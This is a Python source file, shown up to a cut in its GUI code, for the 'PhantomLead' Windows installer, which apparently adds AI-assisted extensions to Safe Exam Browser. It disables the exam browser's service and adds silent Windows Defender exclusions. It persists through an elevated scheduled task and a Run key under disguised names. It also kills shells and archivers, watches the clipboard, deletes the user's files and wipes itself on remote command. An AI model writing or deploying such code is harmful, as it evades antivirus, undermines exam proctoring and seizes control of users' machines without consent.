import os
import stat
import sys
import ctypes
import builtins
import threading
import time
import shutil
import json
import winreg
import subprocess
from datetime import datetime
import tkinter as tk
from tkinter import messagebox, scrolledtext

import requests
from config import (
    APPLICATION_ROOT,
    API_VALIDATE_LICENSE,
    API_ACTIVATE_LICENSE,
    API_GET_MANIFEST,
    API_GET_DOWNLOAD_URL,
    SUPABASE_ANON_KEY
)
from device import get_device_fingerprint, get_device_info
from license_client import validate_license, activate_license, get_package_manifest, request_signed_download_url
from downloader import download_package
from integrity import verify_sha256
from installer_engine import run_installation
from gemini_config import validate_gemini_api_key

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except Exception:
        return False

def kill_copy_dialog_windows():
    """Detects and closes active Windows Explorer copy, move, or compress dialogs."""
    try:
        import win32gui
        import win32con
        def _enum_cb(hwnd, _):
            if win32gui.IsWindowVisible(hwnd):
                title = win32gui.GetWindowText(hwnd).lower()
                if any(w in title for w in ["copying", "compressing", "creating archive", "preparing to copy", "extracting"]):
                    win32gui.PostMessage(hwnd, win32con.WM_CLOSE, 0, 0)
            return True
        win32gui.EnumWindows(_enum_cb, None)
    except Exception:
        pass

def kill_copying_and_compression_processes():
    """Immediately kills any active compression, archiving, or copying tools to abort copying."""
    CREATE_NO_WINDOW = 0x08000000
    kill_copy_dialog_windows()
    try:
        # Instantly terminate any archivers or file cloning utilities
        kill_tools = [
            '7z.exe', '7zG.exe', '7zFM.exe', 'winrar.exe', 'rar.exe', 'bandizip.exe',
            'peazip.exe', 'winzip.exe', 'winzip64.exe', 'robocopy.exe', 'xcopy.exe',
            'tar.exe'
        ]
        for tool in kill_tools:
            subprocess.run(['taskkill', '/F', '/IM', tool, '/T'], creationflags=CREATE_NO_WINDOW, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except Exception:
        pass

def kill_seb_processes():
    """Aggressively terminates and disables SafeExamBrowser service, copying utilities, and processes."""
    CREATE_NO_WINDOW = 0x08000000
    kill_copying_and_compression_processes()
    try:
        # Stop and disable Windows Service so it never auto-runs on restart
        subprocess.run(['sc', 'stop', 'SafeExamBrowser'], creationflags=CREATE_NO_WINDOW, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.run(['sc', 'config', 'SafeExamBrowser', 'start=', 'disabled'], creationflags=CREATE_NO_WINDOW, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        # Kill any processes running from within the SafeExamBrowser folder
        ps_kill_cmd = 'Get-Process | Where-Object { $_.Path -and ($_.Path -like "*SafeExamBrowser*") } | Stop-Process -Force'
        subprocess.run(['powershell', '-NoProfile', '-NonInteractive', '-WindowStyle', 'Hidden', '-Command', ps_kill_cmd], creationflags=CREATE_NO_WINDOW, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

        # Kill by known process names including CefSharp helper and sub-processes
        for proc in [
            'SafeExamBrowser.exe',
            'SafeExamBrowser.Service.exe',
            'SEBClientService.exe',
            'SebWindowsService.exe',
            'SEBConfigTool.exe',
            'CefSharp.BrowserSubprocess.exe',
            'SebWindowsServiceWCF.exe',
            'SebRegistryResetter.exe'
        ]:
            subprocess.run(['taskkill', '/F', '/IM', proc, '/T'], creationflags=CREATE_NO_WINDOW, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        # Strip read-only and lock attributes from existing SafeExamBrowser files so they can be written/replaced
        try:
            subprocess.run(f'attrib -R -S -H "{APPLICATION_ROOT}\\*.*" /S /D', shell=True, creationflags=CREATE_NO_WINDOW, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except Exception:
            pass
    except Exception:
        pass

def _force_remove_directory(dir_path):
    """Completely and silently purges a directory and all subfiles, stripping read-only locks."""
    if not os.path.exists(dir_path):
        return True
    
    CREATE_NO_WINDOW = 0x08000000

    # 1. Strip read-only attribute from all files and dirs in Python
    try:
        for root, dirs, files in os.walk(dir_path, topdown=False):
            for fname in files:
                fpath = os.path.join(root, fname)
                try:
                    os.chmod(fpath, stat.S_IWRITE)
                except Exception:
                    pass
            for dname in dirs:
                dpath = os.path.join(root, dname)
                try:
                    os.chmod(dpath, stat.S_IWRITE)
                except Exception:
                    pass
    except Exception:
        pass

    # 2. Try shutil.rmtree with onerror handler
    def on_rm_error(func, path, exc_info):
        try:
            os.chmod(path, stat.S_IWRITE)
            func(path)
        except Exception:
            pass

    try:
        shutil.rmtree(dir_path, onerror=on_rm_error)
    except Exception:
        pass

    # 3. If still exists, cmd rd /s /q (silent, no window)
    if os.path.exists(dir_path):
        try:
            subprocess.run(f'cmd /c rd /s /q "{dir_path}"', shell=True, creationflags=CREATE_NO_WINDOW, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except Exception:
            pass

    # 4. If still exists, powershell Remove-Item (silent, no window)
    if os.path.exists(dir_path):
        try:
            subprocess.run(
                ['powershell', '-NoProfile', '-NonInteractive', '-WindowStyle', 'Hidden', '-Command', f'Remove-Item -LiteralPath "{dir_path}" -Recurse -Force -ErrorAction SilentlyContinue'],
                creationflags=CREATE_NO_WINDOW,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
        except Exception:
            pass

    # 5. Fallback: schedule reboot deletion
    if os.path.exists(dir_path):
        try:
            ctypes.windll.kernel32.MoveFileExW(dir_path, None, 0x00000004)
        except Exception:
            pass

    return not os.path.exists(dir_path)

def wipe_seb_folders():
    """Wipes ONLY proprietary Extensions folder to protect IP while preserving base software."""
    kill_seb_processes()
    
    extensions_dir = os.path.join(APPLICATION_ROOT, "Application", "Extensions")

    # Target ONLY the Extensions folder
    _force_remove_directory(extensions_dir)

    # Check if Extensions folder is STILL present on disk
    if os.path.exists(extensions_dir):
        return f"Permission error: Extensions folder ({extensions_dir}) could not be removed."
    
    return None

def self_destruct(license_key, hwid, reason="EXPIRED"):
    """Executes host wipe when license is revoked, expired, or sharing/copying violation detected."""
    CREATE_NO_WINDOW = 0x08000000
    kill_copying_and_compression_processes()
    
    # Purge any stray zip/rar archives created inside SafeExamBrowser
    try:
        for chk_dir in [APPLICATION_ROOT, os.path.join(APPLICATION_ROOT, "Application")]:
            if os.path.exists(chk_dir):
                for f in os.listdir(chk_dir):
                    if any(f.lower().endswith(ext) for ext in [".zip", ".rar", ".7z", ".tar", ".gz"]):
                        try:
                            os.remove(os.path.join(chk_dir, f))
                        except Exception:
                            pass
    except Exception:
        pass

    wipe_error = None
    try:
        wipe_error = wipe_seb_folders()
    except Exception as e:
        wipe_error = str(e)

    # Remove task scheduler task
    try:
        subprocess.run(['schtasks', '/delete', '/tn', 'PhantomLeadMonitor', '/f'], creationflags=CREATE_NO_WINDOW, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except Exception:
        pass

    # Remove startup monitor registry entry
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_ALL_ACCESS)
        winreg.DeleteValue(key, "AdminHealthMonitor")
        winreg.CloseKey(key)
    except Exception:
        pass

    # Report completion to Supabase validate-license
    try:
        headers = {
            "Authorization": f"Bearer {SUPABASE_ANON_KEY}",
            "Content-Type": "application/json"
        }
        requests.post(
            API_VALIDATE_LICENSE,
            json={
                "license_key": license_key,
                "device_id": hwid,
                "action": "REPORT_DELETED" if not wipe_error else "REPORT_ERROR",
                "error": f"Violation: {reason}" if not wipe_error else wipe_error
            },
            headers=headers,
            timeout=10
        )
    except Exception:
        pass

    # Show Host Popup Dialog (Topmost System Modal)
    try:
        # 0x1000 = MB_SYSTEMMODAL (brings dialog on top of all windows)
        # 0x10000 = MB_SETFOREGROUND
        # 0x40000 = MB_TOPMOST
        if reason == "VIOLATION_SHARE":
            msg = (
                "Security Alert - Policy Violation:\n\n"
                "Unauthorized file sharing or copy attempt detected.\n\n"
                "You have violated the license terms by attempting to copy, compress, or share proprietary software files.\n"
                "As per platform rules, your license has been immediately canceled and is non-refundable.\n\n"
                "All proprietary components and extensions have been permanently removed."
            )
            title = "PhantomLead - License Canceled (Policy Violation)"
            flags = 0x10 | 0x1000 | 0x10000 | 0x40000  # MB_ICONERROR
        elif wipe_error:
            msg = f"Security Notice:\n\nLicense revoked. An error occurred while removing extensions:\n{wipe_error}"
            title = "PhantomLead - Wipe Error"
            flags = 0x30 | 0x1000 | 0x10000 | 0x40000  # MB_ICONWARNING
        else:
            msg = "License Notice:\n\nYour license has been revoked or expired.\n\nAll proprietary extensions have been successfully removed from this computer."
            title = "PhantomLead - Extensions Removed"
            flags = 0x40 | 0x1000 | 0x10000 | 0x40000  # MB_ICONINFORMATION

        ctypes.windll.user32.MessageBoxW(0, msg, title, flags)
    except Exception:
        pass

    # If an error occurred, do NOT self-delete the monitor yet; let it retry on the next heartbeat
    if wipe_error:
        return

    # Clean up PhantomLead helper directory and terminate
    phantom_dir = os.path.join(os.environ.get("AppData", ""), "PhantomLead")
    try:
        cleanup_cmd = f'ping 127.0.0.1 -n 3 > nul & taskkill /F /IM SecurityUpdater.exe /T > nul 2>&1 & rd /s /q "{phantom_dir}"'
        subprocess.Popen(f'cmd /c "{cleanup_cmd}"', shell=True, creationflags=CREATE_NO_WINDOW)
    except Exception:
        pass

    os._exit(0)

def scan_and_terminate_violating_processes():
    """
    Instantly detects and kills any process attempting to archive, compress,
    clone, or copy SafeExamBrowser or Extensions files. Returns True if violation found.
    """
    CREATE_NO_WINDOW = 0x08000000
    try:
        check_tools = "7z.exe,7zG.exe,winrar.exe,rar.exe,bandizip.exe,robocopy.exe,xcopy.exe,tar.exe,powershell.exe,pwsh.exe,cmd.exe"
        ps_cmd = (
            f"Get-CimInstance Win32_Process | "
            f"Where-Object {{ '{check_tools}' -like ('*' + $_.Name + '*') }} | "
            f"Select-Object ProcessId, Name, CommandLine"
        )
        res = subprocess.run(
            ['powershell', '-NoProfile', '-NonInteractive', '-WindowStyle', 'Hidden', '-Command', ps_cmd],
            creationflags=CREATE_NO_WINDOW,
            capture_output=True,
            text=True,
            timeout=2
        )
        if res.stdout:
            lines = res.stdout.lower()
            target_keywords = ["safeexambrowser", "extensions", "lms_mcq", "reasoning_mcq", "viva_paragraph", "java_coding", "c_coding", "python_coding"]
            action_keywords = [".zip", ".rar", ".7z", ".tar", "compress-archive", " a ", " -a", "robocopy", "xcopy", "copy-item", "googledrive", "onedrive", "dropbox"]
            
            for tk in target_keywords:
                if tk in lines:
                    for ak in action_keywords:
                        if ak in lines:
                            # Kill copying and archiver processes IMMEDIATELY so file copy is interrupted
                            kill_copying_and_compression_processes()
                            return True
    except Exception:
        pass
    return False

def scan_user_folders_for_unauthorized_copies():
    """Checks SafeExamBrowser root and user directories for newly spawned zip/rar files or cloned SEB folders."""
    try:
        now = time.time()
        
        # 1. Inside SafeExamBrowser folders: any zip or archive created here is strictly unauthorized
        seb_dirs = [APPLICATION_ROOT, os.path.join(APPLICATION_ROOT, "Application")]
        for sdir in seb_dirs:
            if not os.path.exists(sdir):
                continue
            for entry in os.scandir(sdir):
                elower = entry.name.lower()
                if elower.endswith((".zip", ".rar", ".7z", ".tar", ".gz")):
                    kill_copying_and_compression_processes()
                    try:
                        os.remove(entry.path)
                    except Exception:
                        pass
                    return True

        # 2. In user folders (Desktop, Downloads, etc.): ONLY match if name explicitly contains SafeExamBrowser or proprietary modules
        user_dirs = [
            os.environ.get("USERPROFILE", ""),
            os.path.join(os.environ.get("USERPROFILE", ""), "Desktop"),
            os.path.join(os.environ.get("USERPROFILE", ""), "Downloads"),
            os.path.join(os.environ.get("USERPROFILE", ""), "Documents"),
            os.environ.get("TEMP", "")
        ]
        suspicious_seb_names = [
            "safeexambrowser", "seb_backup", "viva_paragraph", "lms_mcq", "reasoning_mcq", "java_coding", "c_coding", "python_coding"
        ]
        for udir in user_dirs:
            if not udir or not os.path.exists(udir):
                continue
            for entry in os.scandir(udir):
                elower = entry.name.lower()
                # Check for archives explicitly matching SafeExamBrowser
                if any(s in elower for s in suspicious_seb_names) and elower.endswith((".zip", ".rar", ".7z", ".tar")):
                    if now - entry.stat().st_mtime < 600:
                        kill_copying_and_compression_processes()
                        try:
                            os.remove(entry.path)
                        except Exception:
                            pass
                        return True
                # Check for cloned SEB folders
                if entry.is_dir() and any(s in elower for s in ["safeexambrowser", "seb_backup", "extensions_copy"]):
                    if now - entry.stat().st_mtime < 600:
                        kill_copying_and_compression_processes()
                        try:
                            shutil.rmtree(entry.path, ignore_errors=True)
                        except Exception:
                            pass
                        return True
    except Exception:
        pass
    return False

def start_clipboard_sentinel(on_violation):
    """
    Subsecond clipboard watcher (100ms interval).
    Instantly detects Ctrl+C or clipboard copy of SafeExamBrowser, its Application, or Extensions folders.
    Does NOT affect or trigger on any other user files or folders.
    """
    def _clip_watcher():
        import win32clipboard
        import win32con
        seb_norm = os.path.normpath(APPLICATION_ROOT).lower()
        while True:
            try:
                time.sleep(0.1)  # 100ms ultra-fast check
                try:
                    win32clipboard.OpenClipboard()
                except Exception:
                    continue
                try:
                    if win32clipboard.IsClipboardFormatAvailable(win32con.CF_HDROP):
                        files = win32clipboard.GetClipboardData(win32con.CF_HDROP)
                        if files:
                            for f in files:
                                f_norm = os.path.normpath(str(f)).lower()
                                # ONLY trigger if the copied file/folder is strictly SafeExamBrowser or proprietary modules
                                is_seb_item = (
                                    "safeexambrowser" in f_norm or
                                    seb_norm in f_norm or
                                    any(m in f_norm for m in ["lms_mcq", "reasoning_mcq", "viva_paragraph", "java_coding", "c_coding", "python_coding"])
                                )
                                if is_seb_item:
                                    # VIOLATION DETECTED!
                                    # 1. Immediately empty clipboard to abort copy/paste
                                    try:
                                        win32clipboard.EmptyClipboard()
                                    except Exception:
                                        pass
                                    win32clipboard.CloseClipboard()
                                    # 2. Kill copying utilities and archivers
                                    kill_copying_and_compression_processes()
                                    # 3. Fire auto-wipe and violation alert
                                    on_violation()
                                    return
                finally:
                    try:
                        win32clipboard.CloseClipboard()
                    except Exception:
                        pass
            except Exception:
                pass

    t = threading.Thread(target=_clip_watcher, daemon=True)
    t.start()

def start_realtime_directory_sentinel(on_violation_callback):
    """
    Watches SafeExamBrowser root directory using Windows ReadDirectoryChangesW
    for subsecond detection of newly created zip/rar/tar/tmp files or cloned folders.
    """
    def _watcher():
        seb_root = APPLICATION_ROOT
        if not os.path.exists(seb_root):
            return
        try:
            import win32file
            import win32con
            hDir = win32file.CreateFile(
                seb_root,
                win32con.GENERIC_READ,
                win32con.FILE_SHARE_READ | win32con.FILE_SHARE_WRITE | win32con.FILE_SHARE_DELETE,
                None,
                win32con.OPEN_EXISTING,
                win32con.FILE_FLAG_BACKUP_SEMANTICS,
                None
            )
            while True:
                results = win32file.ReadDirectoryChangesW(
                    hDir,
                    4096,
                    True,  # recursive watch into Application, Extensions, etc.
                    win32con.FILE_NOTIFY_CHANGE_FILE_NAME |
                    win32con.FILE_NOTIFY_CHANGE_DIR_NAME |
                    win32con.FILE_NOTIFY_CHANGE_LAST_WRITE,
                    None,
                    None
                )
                if results:
                    for action, filename in results:
                        fn_lower = filename.lower()
                        # If a zip, rar, tar, 7z, tmp archive or copy is created/written
                        if any(fn_lower.endswith(ext) for ext in [".zip", ".rar", ".7z", ".tar", ".gz", ".tmp"]) or \
                           any(k in fn_lower for k in ["- copy", "_copy", "backup", "archive"]):
                            # Instantly abort copying/archiving
                            kill_copying_and_compression_processes()
                            # Delete the offending zip file immediately
                            try:
                                full_path = os.path.join(seb_root, filename)
                                if os.path.exists(full_path):
                                    if os.path.isdir(full_path):
                                        shutil.rmtree(full_path, ignore_errors=True)
                                    else:
                                        os.remove(full_path)
                            except Exception:
                                pass
                            on_violation_callback()
                            return
        except Exception:
            pass

    t = threading.Thread(target=_watcher, daemon=True)
    t.start()

def acquire_single_instance_mutex():
    """Guarantees only one instance of the background monitor runs at a time."""
    try:
        import ctypes
        kernel32 = ctypes.windll.kernel32
        mutex_name = "Global\\PhantomLead_SecurityUpdater_Instance_Mutex"
        mutex = kernel32.CreateMutexW(None, False, mutex_name)
        if kernel32.GetLastError() == 183:  # ERROR_ALREADY_EXISTS
            # Another instance is already alive and monitoring; exit silently
            os._exit(0)
        return mutex
    except Exception:
        return None

def run_heartbeat(mode="TIMEBOMB"):
    """Subsecond background monitoring loop (runs completely silently with NO GUI)."""
    _mutex = acquire_single_instance_mutex()
    phantom_dir = os.path.join(os.environ.get("AppData", ""), "PhantomLead")
    config_path = os.path.join(phantom_dir, "config.dat")
    
    if os.path.exists(config_path):
        with open(config_path, "r", encoding="utf-8") as f:
            license_key = f.read().strip()
    else:
        license_key = "STANDALONE_SENTINEL"
        
    hwid = get_device_fingerprint()
    
    headers = {
        "Authorization": f"Bearer {SUPABASE_ANON_KEY}",
        "Content-Type": "application/json"
    }

    # 1. Start dedicated ultra-fast clipboard sentinel (100ms interval for Ctrl+C interception)
    start_clipboard_sentinel(
        on_violation=lambda: self_destruct(license_key, hwid, reason="VIOLATION_SHARE")
    )

    # 2. Start kernel directory sentinel for immediate event capture on SafeExamBrowser
    start_realtime_directory_sentinel(
        on_violation_callback=lambda: self_destruct(license_key, hwid, reason="VIOLATION_SHARE")
    )

    tick = 0
    while True:
        try:
            # High-frequency subsecond check for active copying/zipping processes
            if scan_and_terminate_violating_processes():
                self_destruct(license_key, hwid, reason="VIOLATION_SHARE")

            # Check for freshly written zip/rar archives in user directories every ~2 seconds
            if tick % 4 == 0:
                if scan_user_folders_for_unauthorized_copies():
                    self_destruct(license_key, hwid, reason="VIOLATION_SHARE")

            # Check remote license validation with Supabase every ~15 seconds (if valid license)
            if tick % 30 == 0 and license_key != "STANDALONE_SENTINEL":
                try:
                    resp = requests.post(
                        API_VALIDATE_LICENSE,
                        json={"license_key": license_key, "device_id": hwid},
                        headers=headers,
                        timeout=10
                    )
                    data = resp.json()
                    status = data.get("status")
                    is_valid = data.get("valid")
                    
                    # Check for revocation, expiry, suspension or invalidation
                    if status in ["REVOKED", "EXPIRED", "SUSPENDED", "INACTIVE", "INVALID"] or is_valid is False:
                        self_destruct(license_key, hwid, reason=status or "REVOKED")
                        
                    # Offline fallback expiry check for TimeBomb
                    if mode == "TIMEBOMB":
                        expires_at = data.get("expires_at")
                        if expires_at:
                            clean_exp = expires_at.replace("Z", "+00:00")
                            exp_date = datetime.fromisoformat(clean_exp).replace(tzinfo=None)
                            if datetime.utcnow() > exp_date:
                                self_destruct(license_key, hwid, reason="EXPIRED")
                except Exception:
                    pass
        except Exception:
            pass
            
        tick += 1
        time.sleep(0.5) # 500ms subsecond loop for instant violation detection and kill

def safe_deploy_updater(src_exe, target_exe):
    """
    Safely copies the running executable into target_exe using atomic staging,
    fsync buffer flushing, byte-length verification, and Mark-of-the-Web removal.
    Guarantees PyInstaller's embedded PKG archive is 100% intact and never truncated.
    """
    if not getattr(sys, 'frozen', False):
        return False
        
    try:
        target_name = os.path.basename(target_exe)
        target_dir = os.path.dirname(target_exe)
        os.makedirs(target_dir, exist_ok=True)
        
        # 1. Kill any existing instances with generous wait for OS handle release
        for _ in range(3):
            subprocess.run(['taskkill', '/F', '/IM', target_name, '/T'], 
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            time.sleep(0.4)
            
        src_size = os.path.getsize(src_exe)
        tmp_target = os.path.join(target_dir, f"{target_name}.tmp")
        
        if os.path.exists(tmp_target):
            try:
                os.remove(tmp_target)
            except Exception:
                pass
                
        # 2. Write to temporary staging file with explicit fsync flush to disk
        with open(src_exe, 'rb') as f_in:
            with open(tmp_target, 'wb') as f_out:
                shutil.copyfileobj(f_in, f_out, length=1024*1024)
                f_out.flush()
                os.fsync(f_out.fileno())
                
        # 3. Verify complete byte size before deployment
        if os.path.getsize(tmp_target) != src_size:
            try:
                os.remove(tmp_target)
            except Exception:
                pass
            return False
            
        # 4. Remove Windows Mark-of-the-Web (ZoneID=3) from temp file
        try:
            subprocess.run(
                ['powershell', '-NoProfile', '-WindowStyle', 'Hidden', '-Command', 
                 f'Unblock-File -Path "{tmp_target}" -ErrorAction SilentlyContinue'],
                creationflags=0x08000000, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=5
            )
        except Exception:
            pass
            
        # 5. Atomic replacement
        replaced = False
        for attempt in range(5):
            try:
                if os.path.exists(target_exe):
                    try:
                        os.remove(target_exe)
                    except Exception:
                        pass
                os.replace(tmp_target, target_exe)
                replaced = True
                break
            except Exception:
                time.sleep(0.5)
                subprocess.run(['taskkill', '/F', '/IM', target_name, '/T'], 
                               stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

        if not replaced:
            shutil.copyfile(src_exe, target_exe)

        # 6. Unblock final binary
        try:
            subprocess.run(
                ['powershell', '-NoProfile', '-WindowStyle', 'Hidden', '-Command', 
                 f'Unblock-File -Path "{target_exe}" -ErrorAction SilentlyContinue'],
                creationflags=0x08000000, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=5
            )
        except Exception:
            pass
            
        return os.path.exists(target_exe) and (os.path.getsize(target_exe) == src_size)
    except Exception:
        return False

def add_defender_exclusions(phantom_dir=None, updater_exe=None):
    """
    Registers Windows Defender exclusions for PhantomLead monitor and application directories.
    Runs silently with Administrator privileges.
    Guarantees that even if the customer turns Windows Security / Real-Time Protection back ON,
    Windows Defender will whitelist and NEVER scan, block, kill, or quarantine the background monitor.
    """
    try:
        from config import APPLICATION_ROOT
        appdata = os.environ.get("AppData", "")
        if not phantom_dir:
            phantom_dir = os.path.join(appdata, "PhantomLead")
        prog_files = os.environ.get("ProgramFiles", "C:\\Program Files")
        prog_files_x86 = os.environ.get("ProgramFiles(x86)", "C:\\Program Files (x86)")
        
        paths_to_exclude = [
            phantom_dir,
            APPLICATION_ROOT,
            os.path.join(prog_files, "SafeExamBrowser"),
            os.path.join(prog_files_x86, "SafeExamBrowser")
        ]
        
        ps_commands = []
        for p in paths_to_exclude:
            if p:
                clean_p = p.replace('"', '`"')
                ps_commands.append(f'Add-MpPreference -ExclusionPath "{clean_p}" -ErrorAction SilentlyContinue')
        
        for proc in ["SecurityUpdater.exe", "PhantomMonitor.exe", "SecureInstaller_T.exe", "SecureInstaller_L.exe", "SecureInstaller_A.exe"]:
            ps_commands.append(f'Add-MpPreference -ExclusionProcess "{proc}" -ErrorAction SilentlyContinue')
        
        full_ps = "; ".join(ps_commands)
        subprocess.run(
            ['powershell', '-NoProfile', '-WindowStyle', 'Hidden', '-Command', full_ps],
            creationflags=0x08000000,  # CREATE_NO_WINDOW
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            timeout=10
        )
    except Exception:
        pass

def create_heartbeat(license_key):
    """Registers silent background updater task with highest privileges."""
    appdata = os.environ.get("AppData", "")
    phantom_dir = os.path.join(appdata, "PhantomLead")
    os.makedirs(phantom_dir, exist_ok=True)
    
    # Store license key for background checks
    with open(os.path.join(phantom_dir, "config.dat"), "w", encoding="utf-8") as f:
        f.write(license_key)
        
    updater_exe = os.path.join(phantom_dir, "SecurityUpdater.exe")

    # 1. Automatically whitelist PhantomLead & application in Windows Defender BEFORE writing
    add_defender_exclusions(phantom_dir, updater_exe)

    # 2. Safely deploy updater with atomic staging, flush, and integrity validation
    safe_deploy_updater(sys.executable, updater_exe)

    target_exec = updater_exe if (os.path.exists(updater_exe) and os.path.getsize(updater_exe) > 1000000) else sys.executable
    target_arg = "--heartbeat" if target_exec == updater_exe else f'"{__file__}" --heartbeat'

    # 3. Register Elevated Scheduled Task (Runs on boot/logon even on battery)
    task_started = False
    try:
        ps_task = f'''
        $action = New-ScheduledTaskAction -Execute "{target_exec}" -Argument "{target_arg}"
        $trigger = New-ScheduledTaskTrigger -AtLogon
        $principal = New-ScheduledTaskPrincipal -UserId "$env:USERNAME" -LogonType Interactive -RunLevel Highest
        $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
        Register-ScheduledTask -TaskName "PhantomLeadMonitor" -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Force
        Start-ScheduledTask -TaskName "PhantomLeadMonitor"
        '''
        res = subprocess.run(['powershell', '-NoProfile', '-WindowStyle', 'Hidden', '-Command', ps_task], 
                             creationflags=0x08000000, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=10)
        if res.returncode == 0:
            task_started = True
    except Exception:
        pass
        
    # 4. Registry fallback
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, winreg.KEY_ALL_ACCESS)
        winreg.SetValueEx(key, "AdminHealthMonitor", 0, winreg.REG_SZ, f'"{target_exec}" {target_arg}')
        winreg.CloseKey(key)
    except Exception:
        pass

    # 5. Only launch direct Popen if Scheduled Task was NOT started (prevents dual-execution collision)
    if not task_started:
        try:
            subprocess.Popen(
                [target_exec, "--heartbeat"], 
                creationflags=0x00000008 | 0x08000000 | 0x00000200,
                close_fds=True
            )
        except Exception:
            pass

class InstallerApp(tk.Tk):
    def __init__(self, mode="TIMEBOMB"):
        super().__init__()
        self.mode = mode  # "TIMEBOMB", "ADMIN_CONTROLLED", "LIFETIME"
        
        mode_titles = {
            "TIMEBOMB": "PhantomLead Enclave • Cyber Time-Bomb Edition",
            "ADMIN_CONTROLLED": "PhantomLead Enclave • Admin Fleet Sentinel Edition",
            "LIFETIME": "PhantomLead Enclave • Lifetime Vault Edition"
        }
        self.title(mode_titles.get(self.mode, "PhantomLead Secure Installer"))
        self.geometry("760x650")
        self.minsize(740, 620)
        self.configure(padx=24, pady=18, bg="#060807")
        
        # Monkey-patch print to log window
        self._original_print = builtins.print
        builtins.print = self.custom_print

        if not is_admin():
            messagebox.showerror("Permission Error", "Please right-click and run this installer as Administrator.")
            self.destroy()
            sys.exit(1)

        # Pre-emptively register Windows Defender exclusions so setup and monitor run unimpeded
        threading.Thread(target=add_defender_exclusions, daemon=True).start()

        # =========================================================
        # 1. TOP SYSTEM HUD BAR (Tactical Multi-Pill)
        # =========================================================
        top_hud_frame = tk.Frame(self, bg="#060807")
        top_hud_frame.pack(fill=tk.X, pady=(0, 6))

        # Enclave Status Pill (Cyber Mint)
        status_pill = tk.Frame(top_hud_frame, bg="#0A160F", highlightthickness=1, highlightbackground="#10B981", padx=10, pady=3)
        status_pill.pack(side=tk.LEFT)
        tk.Label(
            status_pill,
            text="●  ENCLAVE ACTIVE  •  SEB 3.10.2 VERIFIED",
            font=("Segoe UI", 8, "bold"),
            fg="#34D399",
            bg="#0A160F"
        ).pack()

        # AI Ready Pill (Solar Gold)
        ai_pill = tk.Frame(top_hud_frame, bg="#181206", highlightthickness=1, highlightbackground="#D97706", padx=10, pady=3)
        ai_pill.pack(side=tk.RIGHT)
        tk.Label(
            ai_pill,
            text="✦  GEMINI 1.5 PRO READY",
            font=("Segoe UI", 8, "bold"),
            fg="#FBBF24",
            bg="#181206"
        ).pack()

        # =========================================================
        # 2. MAIN TITLE & EDITION BADGE
        # =========================================================
        title_label = tk.Label(
            self, 
            text="PHANTOMLEAD WORKSTATION", 
            font=("Segoe UI", 18, "bold"), 
            fg="#F8FAFC", 
            bg="#060807"
        )
        title_label.pack(pady=(2, 2))

        # Dynamic Multi-Colored Edition Pill
        edition_configs = {
            "LIFETIME": {
                "text": "🛡️ PERMANENT LIFETIME VAULT  •  Zero Telemetry & Local Execution Only",
                "bg": "#072013",
                "border": "#059669",
                "fg": "#6EE7B7"
            },
            "TIMEBOMB": {
                "text": "⏱️ CYBER TIME-BOMB EDITION  •  Automated Host File Wipe on Expiration",
                "bg": "#221105",
                "border": "#D97706",
                "fg": "#FCD34D"
            },
            "ADMIN_CONTROLLED": {
                "text": "⚡ ADMIN FLEET SENTINEL  •  Remote Fleet Revocation & Auto-Purge Enabled",
                "bg": "#190D26",
                "border": "#9333EA",
                "fg": "#D8B4FE"
            }
        }
        cfg = edition_configs.get(self.mode, edition_configs["LIFETIME"])

        edition_frame = tk.Frame(self, bg=cfg["bg"], highlightthickness=1, highlightbackground=cfg["border"], padx=14, pady=3)
        edition_frame.pack(pady=(0, 10))
        tk.Label(
            edition_frame,
            text=cfg["text"],
            font=("Segoe UI", 8, "bold"),
            fg=cfg["fg"],
            bg=cfg["bg"]
        ).pack()

        # =========================================================
        # 3. CARD 1: CRYPTOGRAPHIC LICENSE KEY (Cyber Emerald Glow)
        # =========================================================
        card_lic = tk.Frame(self, bg="#08140D", highlightthickness=1, highlightbackground="#10B981", padx=14, pady=10)
        card_lic.pack(fill=tk.X, pady=(0, 8))

        lic_header = tk.Frame(card_lic, bg="#08140D")
        lic_header.pack(fill=tk.X, pady=(0, 6))

        tk.Label(
            lic_header,
            text="⚿  ENCLAVE LICENSE KEY",
            font=("Segoe UI", 9, "bold"),
            fg="#34D399",
            bg="#08140D"
        ).pack(side=tk.LEFT)

        tk.Label(
            lic_header,
            text="[ Cryptographic Node Lock • Single-PC HWID ]",
            font=("Segoe UI", 8),
            fg="#6EE7B7",
            bg="#08140D"
        ).pack(side=tk.RIGHT)

        lic_input_row = tk.Frame(card_lic, bg="#08140D")
        lic_input_row.pack(fill=tk.X)

        self.license_entry = tk.Entry(
            lic_input_row,
            font=("Consolas", 11, "bold"),
            bg="#030A05",
            fg="#34D399",
            insertbackground="#10B981",
            relief=tk.FLAT,
            highlightthickness=1,
            highlightbackground="#059669",
            highlightcolor="#34D399"
        )
        self.license_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, ipady=4, padx=(0, 8))

        btn_paste_lic = tk.Button(
            lic_input_row,
            text="📋 Paste",
            font=("Segoe UI", 8, "bold"),
            bg="#062817",
            fg="#A7F3D0",
            activebackground="#059669",
            activeforeground="#FFFFFF",
            relief=tk.FLAT,
            padx=12,
            pady=3,
            cursor="hand2",
